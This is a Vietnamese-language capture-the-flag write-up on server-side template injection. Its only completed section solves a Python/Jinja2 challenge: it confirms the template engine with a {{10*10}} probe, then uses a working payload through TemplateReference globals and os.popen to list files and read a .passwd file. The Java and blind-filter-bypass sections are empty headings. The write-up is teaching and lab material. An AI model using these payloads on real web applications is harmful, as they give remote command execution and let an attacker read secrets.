# Trần Mạnh Huy

* [Python - Server-side Template Injection Introduction](#python---server-side-template-injection-introduction)
* [Java - Server-side Template Injection](#java---server-side-template-injection)
* [Python - Blind SSTI Filters Bypass](#Python - Blind SSTI Filters Bypass)


## Python - Server-side Template Injection Introduction

```
Statement

This service allows you to generate a web page. Use it to read the flag!

```

#### Đễ thấy ứng dụng nhận vào hai tham số trong đó giá trị content gặp phải lỗ hổng SSTI, thử với payload **{{10*10}}** trong phần content được server trả về kết quả: 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_01.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_02.jpg)

Do kết quả trả về là "10101010101010101010" nên có thể xác nhận template được dùng ở đây là jinja2, còn nếu trả về 100 thì sẽ là template twig.

#### Đã xác định được template là jinja2, ta có thể build được payload khai thác từ nó
Dùng TemplateReference object để import các module bằng payload:

```
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('ls').read() }}

```
Ta được:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_03.jpg)

#### Thay payload trên bằng {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('ls -lsa').read() }}

Thấy được file .passwd. Sửa payload thành : **{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('cat .passwd').read() }}** ta được pass để giải chall này

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_04.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root01_06.jpg)


## Java - Server-side Template Injection

## Python - Blind SSTI Filters Bypass
